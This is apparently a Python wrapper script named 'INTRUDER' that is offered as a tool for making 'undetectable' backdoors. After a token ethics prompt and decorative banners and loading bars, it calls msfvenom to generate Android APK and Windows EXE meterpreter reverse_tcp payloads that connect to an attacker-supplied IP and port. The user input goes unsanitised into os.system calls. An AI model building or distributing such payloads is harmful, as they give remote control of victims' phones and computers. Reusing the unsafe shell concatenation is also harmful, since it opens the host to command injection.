import os
import time
from tqdm import tqdm


print("===========================================================================================")
print("|                                           INTRUDER                                      |")
print("===========================================================================================")
print("""                                                                                         

                                           ==========+ 
                                          |  __  __  ||
                                          | |  ||  | ||
                                          | |  ||  | ||
                                          | |__||__| |--
                                          |  __  __()|\ Peeking in...
                                          | |  ||  | +|
                                          | |  ||  | ||
                                          | |  ||  | ||
                                          | |__||__| ||
                                          |__________|-                                 
                                            BACKDOOR                                                      
""")
print("--------------------------------------------------------------------------------------------")
print("   This tool is used to create undetectable payload for windows and android os systems.")
print("   Please do not use this tool for unethical purpose, this tool will not be responsible.")
print("--------------------------------------------------------------------------------------------")
repeater = input("  \n [Are you going to use this tool in an ethical manner]:(yes or no) ? : ").lower()
while repeater not in ["yes", "no"]: repeater = input("Invalid Input. Please try again : ").lower()
if repeater == "yes":
    roll_again = True
    print(" \n    Starting Payload Framework....")
    time.sleep(5)
    print("    Checking all the required tools....")
    time.sleep(2.5)
    print(" \n    [1]. File Access ✓ ")
    print("    [2]. Root Access ✓ ")
    time.sleep(5)

    loop = tqdm(total = 500000, position=0, leave=False)
    for k in range(500000):
        loop.set_description("Loading...".format(k))
        loop.update(1)
    loop.close()

    print("\n===========================================================================================")
    print("""

     ██╗███╗   ██╗████████╗██████╗ ██╗   ██╗██████╗ ███████╗██████╗ 
     ██║████╗  ██║╚══██╔══╝██╔══██╗██║   ██║██╔══██╗██╔════╝██╔══██╗
     ██║██╔██╗ ██║   ██║   ██████╔╝██║   ██║██║  ██║█████╗  ██████╔╝    
     ██║██║╚██╗██║   ██║   ██╔══██╗██║   ██║██║  ██║██╔══╝  ██╔══██╗
     ██║██║ ╚████║   ██║   ██║  ██║╚██████╔╝██████╔╝███████╗██║  ██║
     ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ Developed by Eshwar
""")
    print("===========================================================================================")

    print("""
   .--------------------------------------------------------------------.        
   | [Esc] [F1][F2][F3][F4][F5][F6][F7][F8][F9][F0][F10][F11][F12] o o o|        
   |                                                                    |        
   | [`][1][2][3][4][5][6][7][8][9][0][-][=][_<_] [I][H][U] [N][/][*][-]|        
   | [|-][Q][W][E][R][T][Y][U][I][O][P][{][}] | | [D][E][D] [7][8][9]|+||        
   | [CAP][A][S][D][F][G][H][J][K][L][;]['][#]|_|           [4][5][6]|_||        
   | [^][\][Z][X][C][V][B][N][M][,][.][/] [__^__]    [^]    [1][2][3]| ||        
   | [c]   [a][________________________][a]   [c] [<][V][>] [ 0  ][.]|_||        
   `--------------------------------------------------------------------'                                   
""")
    print("===========================================================================================")
    print("Choose Payload>>>")
    print("\n    [1].Android choose [1]")
    print("    [2].Windows choose [2]")
    print("    [3].Exit choose [3]")
    platform = int(input("\nEnter number >>"))


    def android():
        global ip, port, apk_name
        print("\n   Enter your ip address >>")
        ip = input()
        print("   Enter the port >>")
        port = input()
        print("   Enter the name of apk with .apk extension >>")
        apk_name = input()


    def windows():
        global ip, port, windows_name
        print("\n   Enter your ip address >>")
        ip = input()
        print("   Enter the port >>")
        port = input()
        print("   Enter the name of file with .exe extension >>")
        windows_name = input()


    if platform == 1:
        android()
        os.system(
            "msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " " + "LPORT=" + port + " " + "R >" + " " + apk_name)
        print("Your payload have been successfully created")
        print("You can use it with msfconsole")

    if platform == 2:
        windows()
        os.system(
            "msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " " + "LPORT=" + port + " " + " -f exe -o" + " " + windows_name)
        print("     Your payload have been successfully created")
        print("     You can use it with msfconsole")

    if platform == 3:
        exit("      Exiting Intruder..............")

elif repeater == "no":
    print("You are not allowed to use this tool please restart the tool")